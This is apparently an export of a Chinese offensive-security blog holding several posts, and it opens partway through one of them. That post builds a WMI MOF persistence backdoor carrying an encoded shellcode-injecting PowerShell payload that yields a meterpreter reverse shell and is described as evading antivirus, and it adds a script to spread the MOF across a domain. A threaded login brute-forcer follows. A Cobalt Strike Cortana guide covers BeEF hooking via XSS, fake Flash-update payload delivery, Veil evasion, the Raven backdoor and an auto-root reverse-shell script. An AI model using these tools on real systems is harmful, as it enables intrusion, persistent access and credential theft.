JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAegAgAD0AIAAwAHgAZAA5ACwAMAB4AGMANAAsADAAeABiAGEALAAwAHgAYQBlACwAMAB4AGUAZAAsADAAeABmADMALAAwAHgANgA0ACwAMAB4AGQAOQAsADAAeAA3ADQALAAwAHgAMgA0ACwAMAB4AGYANAAsADAAeAA1AGYALAAwAHgAMgBiACwAMAB4AGMAOQAsADAAeABiADEALAAwAHgANAA3ACwAMAB4ADMAMQAsADAAeAA1ADcALAAwAHgAMQA4ACwAMAB4ADgAMwAsADAAeABjADcALAAwAHgAMAA0ACwAMAB4ADAAMwAsADAAeAA1ADcALAAwAHgAYgBhACwAMAB4ADAAZgAsADAAeAAwADYALAAwAHgAOQA4ACwAMAB4ADIAYQAsADAAeAA0AGQALAAwAHgAZQA5ACwAMAB4ADYAMQAsADAAeABhAGEALAAwAHgAMwAyACwAMAB4ADYAMwAsADAAeAA4ADQALAAwAHgAOQBiACwAMAB4ADcAMgAsADAAeAAxADcALAAwAHgAYwBjACwAMAB4ADgAYgAsADAAeAA0ADIALAAwAHgANQAzACwAMAB4ADgAMAAsADAAeAAyADcALAAwAHgAMgA4ACwAMAB4ADMAMQAsADAAeAAzADEALAAwAHgAYgBjACwAMAB4ADUAYwAsADAAeAA5AGUALAAwAHgAMwA2ACwAMAB4ADcANQAsADAAeABlAGEALAAwAHgAZgA4ACwAMAB4ADcAOQAsADAAeAA4ADYALAAwAHgANAA3ACwAMAB4ADMAOAAsADAAeAAxAGIALAAwAHgAMAA0ACwAMAB4ADkAYQAsADAAeAA2AGQALAAwAHgAZgBiACwAMAB4ADMANQAsADAAeAA1ADUALAAwAHgANgAwACwAMAB4AGYAYQAsADAAeAA3ADIALAAwAHgAOAA4ACwAMAB4ADgAOQAsADAAeABhAGUALAAwAHgAMgBiACwAMAB4AGMANgAsADAAeAAzAGMALAAwAHgANQBmACwAMAB4ADUAOAAsADAAeAA5ADIALAAwAHgAZgBjACwAMAB4AGQANAAsADAAeAAxADIALAAwAHgAMwAyACwAMAB4ADgANQAsADAAeAAwADkALAAwAHgAZQAyACwAMAB4ADMANQAsADAAeABhADQALAAwAHgAOQBmACwAMAB4ADcAOQAsADAAeAA2AGMALAAwAHgANgA2ACwAMAB4ADIAMQAsADAAeABhAGUALAAwAHgAMAA0ACwAMAB4ADIAZgAsADAAeAAzADkALAAwAHgAYgAzACwAMAB4ADIAMQAsADAAeABmADkALAAwAHgAYgAyACwAMAB4ADAANwAsADAAeABkAGQALAAwAHgAZgA4ACwAMAB4ADEAMgAsADAAeAA1ADYALAAwAHgAMQBlACwAMAB4ADUANgAsADAAeAA1AGIALAAwAHgANQA3ACwAMAB4AGUAZAAsADAAeABhADYALAAwAHgAOQBiACwAMAB4ADUAZgAsADAAeAAwAGUALAAwAHgAZABkACwAMAB4AGQANQAsADAAeAA5AGMALAAwAHgAYgAzACwAMAB4AGUANgAsADAAeAAyADEALAAwAHgAZABmACwAMAB4ADYAZgAsADAAeAA2ADIALAAwAHgAYgAyACwAMAB4ADQANwAsADAAeABmAGIALAAwAHgAZAA0ACwAMAB4ADEAZQAsADAAeAA3ADYALAAwAHgAMgA4ACwAMAB4ADgAMgAsADAAeABkADUALAAwAHgANwA0ACwAMAB4ADgANQAsADAAeABjADAALAAwAHgAYgAyACwAMAB4ADkAOAAsADAAeAAxADgALAAwAHgAMAA0ACwAMAB4AGMAOQAsADAAeABhADQALAAwAHgAOQAxACwAMAB4AGEAYgAsADAAeAAxAGUALAAwAHgAMgBkACwAMAB4AGUAMQAsADAAeAA4AGYALAAwAHgAYgBhACwAMAB4ADcANgAsADAAeABiADEALAAwAHgAYQBlACwAMAB4ADkAYgAsADAAeABkADIALAAwAHgAMQA0ACwAMAB4AGMAZQAsADAAeABmAGMALAAwAHgAYgBkACwAMAB4AGMAOQAsADAAeAA2AGEALAAwAHgANwA2ACwAMAB4ADUAMwAsADAAeAAxAGQALAAwAHgAMAA3ACwAMAB4AGQANQAsADAAeAAzAGIALAAwAHgAZAAyACwAMAB4ADIAYQAsADAAeABlADYALAAwAHgAYgBiACwAMAB4ADcAYwAsADAAeAAzAGMALAAwAHgAOQA1ACwAMAB4ADgAOQAsADAAeAAyADMALAAwAHgAOQA2ACwAMAB4ADMAMQAsADAAeABhADEALAAwAHgAYQBjACwAMAB4ADMAMAAsADAAeABjADUALAAwAHgAYwA2ACwAMAB4ADgANgAsADAAeAA4ADUALAAwAHgANQA5ACwAMAB4ADMAOQAsADAAeAAyADkALAAwAHgAZgA2ACwAMAB4ADcAMAAsADAAeABmAGQALAAwAHgANwBkACwAMAB4AGEANgAsADAAeABlAGEALAAwAHgAZAA0ACwAMAB4AGYAZAAsADAAeAAyAGQALAAwAHgAZQBiACwAMAB4AGQAOQAsADAAeAAyAGIALAAwAHgAZABiACwAMAB4AGUAZQAsADAAeAA0AGQALAAwAHgAMQA0ACwAMAB4AGIANAAsADAAeABiAGIALAAwAHgAMAAwACwAMAB4AGYAYwAsADAAeABjADcALAAwAHgAMwBiACwAMAB4ADMAOAAsADAAeAA0ADQALAAwAHgANABlACwAMAB4AGQAZAAsADAAeAA2AGMALAAwAHgAZQA2ACwAMAB4ADAAMQAsADAAeAA3ADIALAAwAHgAYwBjACwAMAB4ADUANgAsADAAeABlADIALAAwAHgAMgAyACwAMAB4AGEANAAsADAAeABiAGMALAAwAHgAZQBkACwAMAB4ADEAZAAsADAAeABkADQALAAwAHgAYgBlACwAMAB4ADIANwAsADAAeAAzADYALAAwAHgANwBlACwAMAB4ADUAMQAsADAAeAA5AGUALAAwAHgANgBlACwAMAB4ADEANgAsADAAeABjADgALAAwAHgAYgBiACwAMAB4AGUANQAsADAAeAA4ADcALAAwAHgAMQA1ACwAMAB4ADEANgAsADAAeAA4ADAALAAwAHgAOAA3ACwAMAB4ADkAZQAsADAAeAA5ADUALAAwAHgANwA0ACwAMAB4ADQAOQAsADAAeAA1ADcALAAwAHgAZAAzACwAMAB4ADYANgAsADAAeAAzAGQALAAwAHgAOQA3ACwAMAB4AGEAZQAsADAAeABkADUALAAwAHgAZQBiACwAMAB4AGEAOAAsADAAeAAwADQALAAwAHgANwAzACwAMAB4ADEAMwAsADAAeAAzAGQALAAwAHgAYQAzACwAMAB4AGQAMgAsADAAeAA0ADQALAAwAHgAYQA5ACwAMAB4AGEAOQAsADAAeAAwADMALAAwAHgAYQAyACwAMAB4ADcANgAsADAAeAA1ADEALAAwAHgANgA2ACwAMAB4AGIAOQAsADAAeABiAGYALAAwAHgAYwA3ACwAMAB4AGMAOQAsADAAeABkADUALAAwAHgAYgBmACwAMAB4ADAANwAsADAAeABjAGEALAAwAHgAMgA1ACwAMAB4ADkANgAsADAAeAA0AGQALAAwAHgAYwBhACwAMAB4ADQAZAAsADAAeAA0AGUALAAwAHgAMwA2ACwAMAB4ADkAOQAsADAAeAA2ADgALAAwAHgAOQAxACwAMAB4AGUAMwAsADAAeAA4AGQALAAwAHgAMgAxACwAMAB4ADAANAAsADAAeAAwAGMALAAwAHgAZQA0ACwAMAB4ADkANgAsADAAeAA4AGYALAAwAHgANgA0ACwAMAB4ADAAYQAsADAAeABjADEALAAwAHgAZgA4ACwAMAB4ADIAYQAsADAAeABmADUALAAwAHgAMgA0ACwAMAB4AGYAOQAsADAAeAAxADcALAAwAHgAMgAwACwAMAB4ADAAMAAsADAAeAA4AGYALAAwAHgANwA5ACwAMAB4AGYAMAA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAGcALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHoALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAaQArACsAKQAgAHsAJAB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAeAAuAFQAbwBJAG4AdAAzADIAKAApACsAJABpACkALAAgACQAegBbACQAaQBdACwAIAAxACkAfQA7ACQAdwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAeAAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkADEAKQApADsAJAAyACAAPQAgACIALQBlAG4AYwAgACIAOwBpAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFMAaQB6AGUAIAAtAGUAcQAgADgAKQB7ACQAMwAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJAAzACAAJAAyACAAJABlACIAfQBlAGwAcwBlAHsAOwBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIAAkAGUAIgA7AH0A";&#125;;instance of __EventFilter as $Filt&#123; Name = "EventFilter"; EventNamespace = "Root\\Cimv2"; Query ="SELECT * FROM __InstanceCreationEvent Within 5" "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"notepad.exe\" "; QueryLanguage = "WQL";&#125;;instance of __FilterToConsumerBinding &#123; Filter = $Filt; Consumer = $Cons;&#125;; 将以上内容保存为test.mof，如果拥有管理员权限，可以将test.mof放到%SYSTEMROOT%/wbem/MOF目录（xp以下操作系统），系统会自动编译执行此脚本，如果在XP 或者更高版本的操作系统上可以执行如下命令：1C:\&gt;mofcomp.exe c:\test.mof 执行以后，当打开记事本的时候，则可生成meterpreter会话： 同时，这个mof文件是免杀的： 当然除了这个我们还可以做其他事情，比如关闭某个程序，当其启动时就关闭，MOF文件如下：123456789101112131415161718192021#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")instance of CommandLineEventConsumer as $Cons&#123; Name = "Powershell Helper 2"; RunInteractively=false; CommandLineTemplate="cmd /C powershell.exe Stop-Process -processname notepad -Force";&#125;;instance of __EventFilter as $Filt&#123; Name = "EventFilter 2"; EventNamespace = "Root\\Cimv2"; Query ="SELECT * FROM __InstanceCreationEvent Within 3" "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"notepad.exe\" "; QueryLanguage = "WQL";&#125;;instance of __FilterToConsumerBinding&#123; Filter = $Filt; Consumer = $Cons;&#125;; 如果我们想要远程执行，可使用如下命令：1c:\&gt;mofcomp -N \\[machinename]\root\subscription test.mof 如果我们在域内，还可以用下面的Powershell脚本批量远程执行：123456789101112131415161718192021222324252627function getNetHosts &#123;$final = @()＃获取域计算机$strCategory = "computer"$objDomain = New-Object System.DirectoryServices.DirectoryEntry$objSearcher = New-Object System.DirectoryServices.DirectorySearcher$objSearcher.SearchRoot = $objDomain$objSearcher.Filter = ("(objectCategory=$strCategory)")$colProplist = "name", "cn"foreach ($i in $colPropList)&#123;$objSearcher.PropertiesToLoad.Add($i)&#125;$colResults = $objSearcher.FindAll()foreach ($objResult in $colResults) &#123; $objComputer = $objResult.Properties $bleh = $objComputer.name $final += $bleh&#125;return $final&#125;$nethosts= getNetHostsforeach ($nethost in $nethosts)&#123; write-host "Exec on " + $nethost $str = "\\"+$nethost+"\root\subscription" $m = mofcomp -N $str test.mof&#125; 使用方式为：1c:\&gt; powershell -ExecutionPolicy Bypass .\test.ps1 # mof文件在同一个文件夹下面 0x02 Meterpreter Post Module这里有一个msf的模块，可以实现此后门安装，地址：metasploit-modules，下载以后将其移动到post/windows/ 文件夹则可使用： 1☁ persistence [master] mv mof_ps_persist.rb $msf_path/modules/post/windows/ 在获取meterpreter会话以后，安装此后门：12345678msf exploit(web_delivery) &gt; use post/windows/mof_ps_persist msf post(mof_ps_persist) &gt; set LHOST 192.168.101.1 LHOST =&gt; 192.168.101.1msf post(mof_ps_persist) &gt; set lport 8887lport =&gt; 8887msf post(mof_ps_persist) &gt; set session 4session =&gt; 4msf post(mof_ps_persist) &gt; run 默认payload为windows/meterpreter/reverse_tcp，执行时间间隔为60秒，如果想通过触发方式启动，可以自行修改ruby脚本。 开启监听：12345678msf post(mof_ps_persist) &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 192.168.101.1 lhost =&gt; 192.168.101.1msf exploit(handler) &gt; set lport 8887lport =&gt; 8887msf exploit(handler) &gt; exploit -j 如果看到错误80041003，说明权限不够，可以试试试用bypassuac,具体怎么bypass，请戳我。 当会话中断以后，由于mof自动执行，所以可以重新获取meterpreter会话。当对方电脑重启以后，仍可以获取会话。 如果想要清除后门，可以resource 生成的rc文件。 0x03 停止MOF要停止mof，可进行如下操作： 第一 net stop winmgmt 停止服务，第二 删除文件夹：C:\WINDOWS\system32\wbem\Repository\第三 net start winmgmt 启动服务 0x04 小结本篇文章主要介绍了一些结合MOF与powershell来进行制作后门的方式方法，对于MOF大家可能接触最多的就是在MYSQL提权时使用MOF来提权，其实玩儿法还很多，大家可以继续来研究研究，希望此文对你有帮助。 参考： http://drops.wooyun.org/tips/10346 http://drops.wooyun.org/tips/9973 http://drops.wooyun.org/tips/8290 http://www.codeproject.com/Articles/27914/WMI-MOF-Basics http://www.codeproject.com/Articles/28226/Creating-WMI-Permanent-Event-Subscriptions-Using-M http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html http://www.cnblogs.com/2018/archive/2010/09/25/1834879.html http://www.jb51.net/article/52489.htm]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>backdoor</tag>
        <tag>mof</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Multi-Threaded Brute Forcer]]></title>
    <url>%2Farchives%2FMulti-Threaded_Brute_Forcer.html</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/usr/bin/python import threadingimport Queueimport socket usernameList = open('users.txt','r').read().splitlines()passwordList = open('passwords.txt','r').read().splitlines() class WorkerThread(threading.Thread) : def __init__(self, queue, tid) : threading.Thread.__init__(self) self.queue = queue self.tid = tid def run(self) : while True : username = None try : username = self.queue.get(timeout=1) except Queue.Empty : return try : for password in passwordList: tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) tcpSocket.connect(('### IP Address ###',### Port ###)) tcpSocket.recv(1024) tcpSocket.send("### Syntax that allows login ###") if '### Fail Response ###' in tcpSocket.recv(1024): tcpSocket.close() print "Failed " + username + "/" + password else: print "[+] Successful Login! Username: " + username + " Password: " + password except : raise self.queue.task_done() queue = Queue.Queue() threads = []for i in range(1, 40) : # Number of threads worker = WorkerThread(queue, i) worker.setDaemon(True) worker.start() threads.append(worker) for username in usernameList : queue.put(username) # Push usernames onto queue queue.join() # wait for all threads to exit for item in threads : item.join() print "Testing Complete!"]]></content>
      <categories>
        <category>随便写写</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>brute</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强化你的Cobalt strike之Cortana]]></title>
    <url>%2Farchives%2FCortana.html</url>
    <content type="text"><![CDATA[Cortana是可以用于Cobalt strike以及Armitage的脚本，通过加载cortana可以向Cobalt strike中导入新的第三方工具，最大的好处就是各种第三方工具都进行了可视化，你可以通过点击而不是通过命令行来完成一些操作，当然，通过定制cortana脚本，你可以在渗透测试过程中很方便的做一些批量操作或者自动化攻击等。本篇文章主要选取了一些现有的cortana脚本，来进行简单的介绍。 你可以通过如下命令下载cortana-scripts：1root@kali:~# git clone https://github.com/rsmudge/cortana-scripts.git 本次测试使用的是Cobalt strike2.5，下载地址:戳我(自行验证安全性) 0x00 Cortana console除了可视化操作，cortana也可以使用命令行操作，依此点击View-&gt;Script Console，则可打开，使用Help可以看到如下几个命令：123456789101112131415161718cortana&gt; helpCommands--------askoff #参数为cna脚本，关闭脚本交互功能askon #参数为cna脚本，开启脚本交互功能help #查看帮助信息load #参数为路径，加载Cortana脚本logoff #参数为cna脚本，关闭脚本日志记录logon #参数为cna脚本，开启脚本日志记录ls #列出加载的脚本proff #参数为cna脚本，关闭脚本分析器profile #参数为cna脚本，查看脚本简介pron #参数为cna脚本，开启脚本分析器reload #参数为cna脚本，重新加载脚本troff #参数为cna脚本，关闭脚本跟踪功能tron #参数为cna脚本，开启脚本跟踪功能unload #参数为cna脚本，卸载脚本 下面将介绍几个好用的脚本。 0x01 Beef_strickBeef是一款针对浏览器的渗透测试工具，之前三好学生师傅已经对他有一个比较详细的介绍，而beef_strick则是可以在Cobalt strike及Armitage中加载Beef的一个Cortana脚本，要使用此脚本，首先要先下载安装msf的beef插件。1234root@kali:~# git clone https://github.com/xntrik/beefmetasploitplugin.gitroot@kali:~# cd beefmetasploitplugin/root@kali:~/beefmetasploitplugin# cp plugins/* /usr/share/metasploit-framework/plugins/root@kali:~/beefmetasploitplugin# cp -R lib/* /usr/share/metasploit-framework/lib/ 安装依赖库，执行：12root@kali:~# gem install hpricotroot@kali:~# gem install json 如果不能更新，可以换成淘宝的ruby源，地址为https://ruby.taobao.org/ 启动msf:12root@kali:~# service postgresql startroot@kali:~# msfconsole 加载beef1msf &gt; load beef 在这里有个坑，就是可能会碰到这个错误：经过多次研究最终找到解决方案，直接复制：1cp -R /var/lib/gems/2.1.0/gems/hpricot-0.8.6/lib/* /usr/lib/ruby/vendor_ruby/ 现在再启动msf，就可以加载beef了，如下图： 进入到cortana-scripts的beef_strike目录（测试发现，最新版本的貌似有问题，所以找到了历史版本的来做测试：地址请戳我），修改beef_strike.cna文件，将import的目录改到当前beef_strike的目录: 除此之外，下载以下jar放到lib目录：123root@kali:~/beef_strike# cd libroot@kali:~/beef_strike/lib/# wget https://evi1cg.github.io/payloads/lib.rar #老外整理的jar包，请自行验证安全性，不放心可以自己下载相应jar包root@kali:~/beef_strike/lib/# unrar x lib.rar 之后运行cobaltstrike或者armitage(不支持cobaltstrike3.0)，以下以cobaltstrike做示例：首先加载beef_strike，依此点击cobaltstrike-&gt;Scripts-&gt;load，选择beef_strike.cna 连接beef，选择Attacks-&gt;BeEF Strike-&gt;Start-&gt;control BeFF service，配置beef路径，然后点击strat开启beef服务，之后连接beef服务，如下图： 点击Conect之后填入beef服务地址，用户名，密码就可以连接beef了，这里比较重要的是这个key，如下图：复制这个key，在连接处那里点击key，并将此值填入，就可以正常使用了。 只需要将http://192.168.74.144:3000/hook.js插入存在xss的网站，或者以任意方式执行该js，beef上面就可以看到主机上线了，尝试访问http://192.168.74.144:3000/demos/basic.html测试： 选择一个计算机，点击右键，beef，可以看到其基本信息，右键可以看到beef更多的功能： 比如社会工程学工具里面的fake flash update，点击此按钮之后输出如下参数配置：1"payload_uri":"http://192.168.74.144:81/download/test.exe","image":"http://192.168.74.145:3000/demos/adobe_flash_update.png" 如下图： 之后受害者就会看到一个升级信息：点击以后就会下载我们指定的exe。更多的功能在：这里可以设置自动运行的多个命令，有兴趣的小伙伴可以继续进行研究，具体Beef使用详见：浏览器利用框架BeEF测试。 0x02 Veil_evasionVeil是一款利用Metasploit框架生成相兼容的Payload工具，并且在大多数网络环境中Veil 能绕过常见的杀毒软件，可以使用如下命令下载：1root@kali:~# git clone https://github.com/Veil-Framework/Veil-Evasion.git 下载以后进行配置安装：12root@kali:~# cd Veil-Evasion/setup/root@kali:~/Veil-Evasion/setup# ./setup.sh 之后就安装python等一系列环境就可以正常使用了。加载Veil_evasion，依此点击cobaltstrike-&gt;Scripts-&gt;load，选择Veil_evasion.cna，之后输入Veil-Evasion.py的绝对路径就成功加载 Veil_evasion了，如下图：如果Veil_evasion路径输入错误，可以再set Veil_evasion Path处修改。点击Generate,就可以看到生成payload界面：通过双击Payload，MSFPayload可以选择不同的生成方式，例如：Payload选择c/meterpreter/rev_tcp,MSFPayload选择windows/meterpreter/reverse_tcp，一定要选同类型的，设置监听ip及端口以后，点击Generate，则可以看到生成的路径，点击ok则可生成payload，如下图： 0x03 Login_autopwn此脚本可用于用户口令破解，可以自动化测试多个服务，也可以针对单个服务进行口令破解，可破解的服务包括ssh,smb,ftp,telnet,vnc,vmauthd,pcanywhere,mssql,mysql等，使用前需要修改字典路径： 以及john字典路径： 修改以后，依此点击cobaltstrike-&gt;Scripts-&gt;load，选择login_autopwn.cna，之后通过点击View-&gt;Script Console的打开Cortana,则可看到已经加载 login_autopwn： 输入help，可以查看命令： 获取服务信息之后，直接输入start则可以进行自动化口令探测，当然也可以选择某个模块来进行探测，下面是一个demo: 0x04 RavenRaven是一个Windows后门，他可以访问攻击者控制的服务器，下载RAW shellcode，如果代码可用，他将将代码注入到其他进程中，可以通过”,”来创建多个URL列表，Raven将会采用循环的方式进行尝试，安装Raven以后，他每隔5分钟会访问依此控制服务器，安装方法为： 复制raven.dll 到 c:\windows\linkinfo.dll。 安装raven.exe，可以添加注册表或者添加服务。 Cortana script中已经集成了Raven的使用脚本，使用方式如下：step1：打开终端，开启web服务;1root@kali:~# service apache2 start step2：依次点击View-&gt;Script console;step3：加载server.cna,client.cna; 加载server.cna之前确保web根目录配置正确 step4：依此点击View-&gt;Raven;step5：点击Export EXE，配置服务器地址，http://ip/foo 生成exe;step6：运行exe，之后会看到这样： step7：开启msf监听，使用windows/meterpreter/reverse_tcp ，端口为4444。step8：当有客户端连入时，右键，Meterp tcp,端口为之前的端口，则可获取会话。 0x05 OthersQRcode：用于生成网址的二维码，它使用了google的api，修改一下就可以使用了。annoy：用于骚扰用户的小脚本，包括弹框，禁用鼠标、键盘，关进程，关机等。icons：增加了很多图标，看起来会更炫酷。autoDiscover：用于发现新的网络。autoarp：arp扫描，用于发现网络主机。autofind：用于查找一些指定文件并下载。autohack：这里共有三个脚本，autohack用于自动攻击，当发现22端口时，使用对应的模块进行暴力破解，发现445端口则尝试使用ms08_067,自己可以根据自己的需要进行修改；autohash用于自动执行提权并进行hashdump操作，读取到的hash将存入数据库，执行creds则可以看到存储的hash信息；autopsexec用于发现445端口开放时，使用psexec来测试登陆，使用的密码为数据库存储的hash信息。autoscan：自动扫描脚本，这里也有俩，automsfscan用于在hosts列表增加时自动执行msfscan操作；autonessus将在hosts列表增加时自动执行nessus扫描。av-bypass-demo：这个脚本是在使用psexec时， 自动对payload进行免杀。免杀使用的源码来自于https://github.com/rsmudge/metasploit-loaderbeacon：增加了右键功能，并且为beacon增加了一个图片，看起来更酷炫了。binaries：用于Linux下替换文件。differ：用于提示发现的新增加的服务。eval：一个测试脚本，可以参考器为Cortana编写命令行功能。events-table：增加查看事件功能，加载以后，使用可以通过View -&gt; Events打开。idlewatch：查看用户的空闲时间，并以带颜色的小人图标展示，无图标-&gt;未知空闲时间；绿色图标-&gt;用户正在使用；蓝色图标-&gt;用户活跃在5分钟之内;黄色图标-&gt;用户活跃在30分之内；红色图标-&gt;用户无效。import_creds：此脚本用来将用户凭证导入msf数据库。使用方式为进入cortana命令行，使用import_creds进行导入。int128scripts：int128写的一些脚本，现在有四个，auto_crack是利用msf的jtr_crack_fast对用户凭证进行破解的脚本；find_hosts是使用nmap进行扫描的脚本；find_hosts_ping_large_subnet是对于一个较大的子网指定端口进行快速扫描的脚本；infect是一个创建后门的脚本，Windows下面创建 metsvc后门并添加用户开始3389端口，Linux下面创建用户，添加后门并创建计划任务，使用前记得修改参数。irc-client：一个250行的IRC客户端Cortana脚本。login_logout：用于linux系统跟踪用户登陆信息。multi-meterpreter：用于对多个系统同事执行命令。Botvoice：一个比较好玩儿的功能，能够在使用Cobalt Strike提供语音帮助。new_payload：一个脚本示例，用于替换payload。post-play：此脚本用于自动化执行脚本，可以加载msf的ruby脚本或者shell脚本。当获取会话之后会自动执行。pt_autodoc：此脚本可以监控主机以及服务信息，并将这些数据存入Mysql数据库，同时随时进行更新，可以使用图形化工具比如gephi来观测数据的变化。rc_loader：快速加载rc脚本的脚本。references：写一些菜单的举例脚本。user_hunter：获取用户的脚本。能方便的找到域管理登陆的电脑。safetynet：这个脚本允许用户向meterpreter会话中注入’safetynet’ payload。Sniffer：此脚本用于开启嗅探功能。vulns：示例脚本，用于显示漏洞信息。vy_con：使用此脚本可以控制和管理Vyatta的路由器。 0x06 POSH-Commander在Powrshell如火如荼的时候，怎么能缺少Powershell相关的脚本呢？rvrsh3ll在github开源了一个与Powershell相关的Cortana脚本，使用此脚本可以通过可视化操作远程注入powershell脚本到计算机内存，下载地址为：1root@kali:~# git clone https://github.com/rvrsh3ll/POSH-Commander.git 下载以后，将remote_powershell.rb复制到metasploit-framework/modules/post/windows/manage/powershell/ 目录：1root@kali:~# cp POSH-Commander/msfmodule/remote_powershell.rb /usr/share/metasploit-framework/modules/post/windows/manage/powershell/ 之后打开msf的console界面，执行如下命令：1msf&gt; reload_all 依此点击cobaltstrike-&gt;Scripts-&gt;load，加载posh_commander.cna，当获取meterpreter会话以后，将会看到新增的powershell攻击模块： 选择其中的Veil-PowerView，输入脚本地址，然后就可以选择加载的模块了： 之后可以双击单个模块，添加相应参数然后运行该Powershell脚本。原脚本路径有点问题，不想改的话可以直接试用这个。 测试执行HOST命令，选择Custom Local Command，输入HOST，运行之后可以看到运行返回的结果： 0x07 定制自己的Cortana除了以上的脚本，为了方便我们还可以自己编写属于自己的Cortana脚本，编写示例在Cortana scripts里面已经有了一些，如果有兴趣，你可以看看这个： Cortana教程 Cortana编写示例 比如下面是一个自动对2.6.36内核linux自动提权的脚本：123456789101112131415161718192021222324252627282930313233343536# Auto Rooting &lt; 2.6.36 Menu for Cobalt Engine v0.1 popup shell &#123; if (host_os(session_host($1)) eq "Linux") &#123; menu "Auto Rooting" &#123; item "Auto Rooting &lt; 2.6.36" &#123; println("Auto Rooting"); # Generate Payload $r_lport = random_port(); $backdoor = generate("linux/x86/meterpreter/reverse_tcp", lhost(), $r_lport, %(), "elf"); $handle2 = openf("&gt;/tmp/linux_backdoor_$r_lport"); writeb($handle2, $backdoor); closef($handle2); shell_upload($1, "/tmp/linux_backdoor_$r_lport", "/tmp/linux_backdoor_$r_lport"); # Launch our aux shells handler("linux/x86/meterpreter/reverse_tcp", $r_lport, %(LHOST =&gt; lhost())); # Rooting s_cmd($1, "wget 